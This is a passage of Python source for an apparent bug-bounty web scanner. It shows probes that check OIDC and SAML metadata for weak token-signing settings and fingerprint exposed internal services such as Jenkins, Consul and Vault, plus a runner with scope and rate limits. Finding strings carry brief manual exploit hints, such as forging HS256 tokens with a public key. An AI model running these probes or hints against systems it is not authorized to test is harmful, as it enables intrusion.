                ev_parts.append(f"Root GET returned 200 (read OK; listing closed).")
            if severity:
                test_results.append(DeepScanFinding(
                    url=root, probe=self.name, signal=signal,
                    severity=severity,
                    title=f"{provider} bucket '{bucket}' permits anonymous {signal.split('-')[-1]}",
                    evidence="\n".join(ev_parts),
                    extra={"provider": provider, "bucket": bucket,
                           "discovered-on": found_on},
                ))
            return test_results

        coros = [test_bucket(b, p, f) for b, (p, f) in found_buckets.items()]
        results = await asyncio.gather(*coros, return_exceptions=False)
        for batch in results:
            findings.extend(batch)
        return findings


class SAMLOIDCProbe(DeepScanProbe):
    """Identity-federation endpoint discovery + sanity checks.

    Hits well-known config endpoints for OIDC, OAuth 2.0, SAML, and
    Keycloak. For each that responds with valid metadata:

      * Extract issuer, supported algorithms, authorization/token URLs
      * Flag CRITICAL if `none` is in `id_token_signing_alg_values_supported`
        (`alg=none` JWT acceptance = trivial token forgery)
      * Flag HIGH if `HS256` is supported alongside RSA keys
        (algorithm-confusion lets a leaked JWKS public key sign tokens)
      * Flag HIGH if SAML metadata has `AssertionConsumerService` without
        any signature requirement (signature stripping pivot)

    Identifies the IdP class; the actual claim-swap / signature-strip /
    KID-injection exploits are the operator's manual workflow.
    """
    name = "saml-oidc"
    ENDPOINTS = [
        ("/.well-known/openid-configuration",            "openid-config"),
        ("/.well-known/oauth-authorization-server",      "oauth-config"),
        ("/saml/metadata",                                "saml-metadata"),
        ("/federationmetadata/2007-06/federationmetadata.xml", "saml-fedmd"),
        ("/auth/realms/master/.well-known/openid-configuration", "keycloak-master"),
        ("/realms/master/.well-known/openid-configuration",       "keycloak-master"),
        ("/oauth2/.well-known/openid-configuration",     "okta-style-oidc"),
    ]

    async def run(self, probes: list[dict]) -> list[DeepScanFinding]:
        findings: list[DeepScanFinding] = []
        bases = sorted({p["url"] for p in probes
                        if p.get("status_code") and 200 <= p["status_code"] < 400})
        if not bases:
            return findings
        log.info("saml-oidc", bases=len(bases), endpoints=len(self.ENDPOINTS))

        async def probe_one(base: str, path: str, kind: str):
            url = base.rstrip("/") + path
            r = await self._get(url)
            if r is None or r.status_code != 200:
                return None
            body = (r.text or "")[:8192]
            ctype = (r.headers.get("content-type") or "").lower()

            findings_local: list[DeepScanFinding] = []
            if kind.startswith("openid") or kind in (
                    "oauth-config", "keycloak-master", "okta-style-oidc"):
                if "json" not in ctype and "{" not in body[:200]:
                    return None
                # Parse common fields
                issuer = re.search(r'"issuer"\s*:\s*"([^"]+)"', body)
                algs = re.search(
                    r'"id_token_signing_alg_values_supported"\s*:\s*\[([^\]]+)\]',
                    body)
                alg_list = []
                if algs:
                    alg_list = re.findall(r'"([^"]+)"', algs.group(1))
                jwks = re.search(r'"jwks_uri"\s*:\s*"([^"]+)"', body)

                extra = {
                    "kind": kind,
                    "issuer": issuer.group(1) if issuer else None,
                    "algorithms": alg_list,
                    "jwks_uri": jwks.group(1) if jwks else None,
                }
                # alg=none acceptance — trivially exploitable
                if any(a.lower() == "none" for a in alg_list):
                    findings_local.append(DeepScanFinding(
                        url=url, probe=self.name,
                        signal="oidc-alg-none",
                        severity="critical",
                        title=f"OIDC accepts alg=none on {base}",
                        evidence=f"id_token_signing_alg_values_supported: {alg_list}",
                        extra=extra,
                    ))
                elif "HS256" in alg_list and any(
                        a.startswith("RS") for a in alg_list):
                    findings_local.append(DeepScanFinding(
                        url=url, probe=self.name,
                        signal="oidc-alg-confusion",
                        severity="high",
                        title=f"OIDC mixes HS256 with RSA on {base} — alg-confusion risk",
                        evidence=f"Algorithms: {alg_list}\n"
                                 f"Manual: fetch JWKS public key, sign HS256 token with it.",
                        extra=extra,
                    ))
                else:
                    findings_local.append(DeepScanFinding(
                        url=url, probe=self.name,
                        signal=f"{kind}-discovered",
                        severity="info",
                        title=f"{kind} endpoint live on {base}",
                        evidence=f"Issuer: {extra['issuer']}\nAlgs: {alg_list}\n"
                                 f"JWKS: {extra['jwks_uri']}",
                        extra=extra,
                    ))
            elif kind.startswith("saml"):
                if "xml" not in ctype and "<EntityDescriptor" not in body[:500]:
                    return None
                # Coarse signature-policy check
                wants_signed = ("WantAssertionsSigned=\"true\"" in body or
                                "AuthnRequestsSigned=\"true\"" in body)
                acs = re.findall(r'AssertionConsumerService[^/>]*Location="([^"]+)"',
                                 body)
                if not wants_signed and acs:
                    findings_local.append(DeepScanFinding(
                        url=url, probe=self.name,
                        signal="saml-no-signature-requirement",
                        severity="high",
                        title=f"SAML metadata lacks signature requirement on {base}",
                        evidence=f"ACS endpoints: {acs[:3]}\n"
                                 f"WantAssertionsSigned: false\n"
                                 f"Manual: test signature-stripping with samltool.io",
                        extra={"acs": acs[:5], "wants_signed": wants_signed},
                    ))
                else:
                    findings_local.append(DeepScanFinding(
                        url=url, probe=self.name,
                        signal="saml-metadata-disclosed",
                        severity="info",
                        title=f"SAML metadata exposed on {base}",
                        evidence=f"ACS: {acs[:2]}",
                        extra={"acs": acs[:5], "wants_signed": wants_signed},
                    ))
            return findings_local

        coros = [probe_one(b, path, kind) for b in bases
                 for path, kind in self.ENDPOINTS]
        results = await asyncio.gather(*coros, return_exceptions=False)
        for r in results:
            if r:
                findings.extend(r)
        return findings


class InternalServiceProbe(DeepScanProbe):
    """Fingerprint internal-network services that occasionally end up
    publicly reachable when network isolation is misconfigured.

    Each service has a probe path that returns a distinctive response
    (status code + body marker) when the service is live and reachable
    without auth. Detection is read-only — no login attempts, no API
    writes. Where an unauthenticated API endpoint exists (e.g.,
    Grafana's `/api/health`, Consul's `/v1/agent/self`), the response
    body is the evidence; otherwise the finding flags the login page
    and the operator does manual auth testing.

    Services covered: Jenkins, GitLab, Grafana, Kibana, Consul, Docker
    Registry v2, Splunk, Nexus, SonarQube, Jupyter, Airflow, Vault.
    Each entry pairs a path with a unique-token regex to avoid the
    "every 200-OK is Jenkins" false-positive trap.
    """
    name = "internal-service"
    # (path, regex-token, service-name, severity-if-found)
    SERVICES: list[tuple[str, str, str, str]] = [
        ("/login",                r"(?i)<title>[^<]*Jenkins\b",            "jenkins-login",      "high"),
        ("/asynchPeople/",         r"(?i)Jenkins",                          "jenkins-people",     "high"),
        ("/api/json",              r'"_class"\s*:\s*"hudson\.model\.Hudson"', "jenkins-api",        "high"),
        ("/users/sign_in",         r"(?i)<title>[^<]*GitLab\b",              "gitlab-login",       "high"),
        ("/api/v4/version",        r'"version"',                              "gitlab-api",         "high"),
        ("/api/health",            r'"database"\s*:\s*"ok"',                 "grafana-health",     "medium"),
        ("/api/datasources",       r'^\[\s*\{',                               "grafana-ds-unauth",  "critical"),
        ("/app/kibana",            r"(?i)kibana",                             "kibana-app",         "medium"),
        ("/api/status",            r'"version"\s*:\s*\{',                     "kibana-status",      "medium"),
        ("/v1/agent/self",         r'"Config"',                               "consul-agent",       "high"),
        ("/v2/",                   r'^\{\s*\}$|"errors"\s*:',                "docker-registry-v2", "medium"),
        ("/v2/_catalog",           r'"repositories"',                         "docker-registry-cat","high"),
        ("/en-US/account/login",   r"(?i)splunk",                             "splunk-login",       "high"),
        ("/service/local/status",  r'<status\b',                              "nexus-status",       "medium"),
        ("/api/system/status",     r'"status"',                                "sonarqube-status",   "medium"),
        ("/api/contents",          r'"content"\s*:',                          "jupyter-contents",   "critical"),
        ("/api/v1/health",         r'"metadatabase"',                          "airflow-health",     "high"),
        ("/v1/sys/health",         r'"sealed"',                                "vault-sys-health",   "high"),
        ("/api/system",            r'(?i)elasticsearch|opensearch',            "es-os-system",       "high"),
        ("/_cluster/health",       r'"cluster_name"',                          "elasticsearch-cluster","critical"),
    ]

    async def run(self, probes: list[dict]) -> list[DeepScanFinding]:
        findings: list[DeepScanFinding] = []
        bases = sorted({p["url"] for p in probes
                        if p.get("status_code") and 200 <= p["status_code"] < 400})
        if not bases:
            return findings
        log.info("internal-service", bases=len(bases),
                 services=len(self.SERVICES))

        async def probe_one(base: str, path: str, token_re: str,
                            service: str, sev: str):
            url = base.rstrip("/") + path
            r = await self._get(url)
            if r is None or r.status_code not in (200, 401, 403):
                return None
            body = (r.text or "")[:8192]
            if not re.search(token_re, body):
                return None
            # 401/403 = service identified but auth required (lower confidence)
            adjusted_sev = sev
            if r.status_code in (401, 403):
                adjusted_sev = {"critical": "high", "high": "medium",
                                "medium": "low", "low": "info"}.get(sev, "info")
            return DeepScanFinding(
                url=url, probe=self.name,
                signal=f"service-fingerprint-{service}",
                severity=adjusted_sev,
                title=f"Internal service exposed: {service} on {base}",
                evidence=f"Path: {path}\nStatus: {r.status_code}\n"
                         f"Token: {token_re}\nBody excerpt: {body[:300]}",
                extra={"service": service, "status": r.status_code,
                       "auth-required": r.status_code in (401, 403)},
            )

        coros = [probe_one(b, path, tok, svc, sv)
                 for b in bases
                 for path, tok, svc, sv in self.SERVICES]
        results = await asyncio.gather(*coros, return_exceptions=False)
        for r in results:
            if r:
                findings.append(r)
        return findings


DEFAULT_PROBES = (PathSweep, BackupFileProbe, MethodEnumProbe,
                  Bypass403, CorsProbe, TomcatFingerprint,
                  SpringActuatorProbe, SSTIFingerprintProbe,
                  LFIFlagProbe, SSRFOOBProbe,
                  FileUploadDiscoveryProbe, DeserializationProbe,
                  ObjectStorageProbe, SAMLOIDCProbe, InternalServiceProbe,
                  WaybackHistorical, JsSecretMine,
                  # OriginCandidateProbe disabled — see TODO on the class.
                  # Surfaced 37 FPs on a single PlanetHoster run because
                  # the ASN heuristic flags any non-big-CDN ASN, including
                  # the target's own hosting infra. Re-enable after the
                  # rebuild described in the class docstring.
                  OwaspVulnsProbe)


class DeepScanner:
    """Run a fixed set of probes concurrently against a list of probe-results."""

    def __init__(self, *, concurrency: int = 8, timeout: float = 8.0,
                 user_agent: str = "bb-sentinel-deepscan/0.1",
                 probes: Iterable[type[DeepScanProbe]] = DEFAULT_PROBES,
                 rate_limit_rps: int | None = None,
                 auth_headers: dict[str, str] | None = None,
                 in_scope_hosts: Iterable[str] | None = None,
                 no_write_methods: bool = False,
                 exclude_finding_signals: Iterable[str] | None = None,
                 nuclei_exclude_trees: Iterable[str] | None = None,
                 progress=None) -> None:
        self.concurrency = concurrency
        self.timeout = timeout
        self.user_agent = user_agent
        self.probe_classes = list(probes)
        # Honor program-published rate caps (e.g., Plusgrade's ≤6 RPS clause).
        # Probes that shell out to nuclei pass this to nuclei's -rate-limit;
        # internal-httpx probes use it as a token-bucket budget hint.
        self.rate_limit_rps = rate_limit_rps
        # Per-program auth — propagated to all probes. Python-side probes
        # use in_scope_hosts to scope-restrict the headers (don't leak to
        # CDNs); subprocess tools (nuclei) send globally.
        self.auth_headers = auth_headers or {}
        self.in_scope_hosts = frozenset((h or "").lower() for h in (in_scope_hosts or []))
        # Engagement-level write guardrail. Propagated to every probe so
        # write-capable probes (TomcatFingerprint PUT, file-upload, future
        # state-modifying probes) skip the modification step.
        self.no_write_methods = no_write_methods
        # Out-of-scope finding suppression. Compiled once; applied as a
        # post-probe filter so findings the program can't accept never
        # reach the report writer. Default empty = no suppression.
        self._exclude_signal_res = [
            re.compile(p) for p in (exclude_finding_signals or [])
        ]
        # Per-program nuclei tree exclusions — propagated to OwaspVulnsProbe.
        self.nuclei_exclude_trees = frozenset(nuclei_exclude_trees or [])
        # Optional human-readable progress reporter (see src/progress.py).
        self.progress = progress

    async def scan(self, probes: list[dict]) -> list[DeepScanFinding]:
        import time
        sem = asyncio.Semaphore(self.concurrency)
        async with httpx.AsyncClient(
            verify=False,
            timeout=httpx.Timeout(connect=2.0, read=self.timeout, write=5.0, pool=5.0),
            limits=httpx.Limits(max_connections=self.concurrency * 2),
            headers={"User-Agent": self.user_agent},
        ) as client:
            results: list[DeepScanFinding] = []
            for cls in self.probe_classes:
                probe = cls(
                    client, sem,
                    rate_limit_rps=self.rate_limit_rps,
                    auth_headers=self.auth_headers,
                    in_scope_hosts=self.in_scope_hosts,
                    no_write_methods=self.no_write_methods,
                )
                # OwaspVulnsProbe consumes nuclei_exclude_trees as a runtime
                # override of its class-level TEMPLATE_TREES. Other probes
                # ignore the attribute.
                if isinstance(probe, OwaspVulnsProbe) and self.nuclei_exclude_trees:
                    probe.template_trees_override = tuple(
                        t for t in probe.TEMPLATE_TREES
                        if t not in self.nuclei_exclude_trees
                    )
                t_start = time.monotonic()
                if self.progress:
                    self.progress.step(cls.name, "running…")
                try:
                    fs = await probe.run(probes)
                    # OOS suppression — drop findings whose signal matches
                    # any configured exclude regex BEFORE they propagate
                    # into the report writer. Logged at INFO so the
                    # operator can see how much was filtered per probe.
                    if self._exclude_signal_res:
                        before = len(fs)
                        fs = [f for f in fs
                              if not any(r.match(f.signal)
                                         for r in self._exclude_signal_res)]
                        if before != len(fs):
                            log.info("probe findings suppressed (OOS filter)",
                                     probe=cls.name,
                                     suppressed=before - len(fs),
                                     remaining=len(fs))
                    log.info("probe done", probe=cls.name, findings=len(fs))
                    results.extend(fs)
                    if self.progress:
                        dur = time.monotonic() - t_start
                        sev_counts = {}
                        for f in fs:
                            sev_counts[f.severity] = sev_counts.get(f.severity, 0) + 1
                        sev_summary = ", ".join(
                            f"{n} {s}" for s, n in sorted(
                                sev_counts.items(),
                                key=lambda kv: SEVERITY_ORDER.index(kv[0]))
                        ) or "no findings"
                        self.progress.step(
                            cls.name,
                            f"{sev_summary}  ({self.progress._fmt_duration(dur)})",
                            ok=True,
                        )
                except Exception as e:
                    log.exception("probe failed", probe=cls.name)
                    if self.progress:
                        self.progress.step(cls.name, f"failed: {type(e).__name__}: {str(e)[:80]}",
                                            ok=False)
            results.sort(key=lambda f: SEVERITY_ORDER.index(f.severity))
            return results


__all__ = [
    "DeepScanFinding", "DeepScanner", "DeepScanProbe",
    "PathSweep", "BackupFileProbe", "MethodEnumProbe",
    "Bypass403", "CorsProbe", "TomcatFingerprint",
    "SpringActuatorProbe", "SSTIFingerprintProbe",
    "LFIFlagProbe", "SSRFOOBProbe",
    "FileUploadDiscoveryProbe", "DeserializationProbe",
    "ObjectStorageProbe", "SAMLOIDCProbe", "InternalServiceProbe",
    "WaybackHistorical", "JsSecretMine",
    "OriginCandidateProbe", "OwaspVulnsProbe",
    "HIGH_VALUE_PATHS", "BACKUP_SUFFIXES", "BYPASS_HEADERS", "TOMCAT9_CVE_BANDS",
    "SEVERITY_ORDER", "SEVERITY_WEIGHT",
]
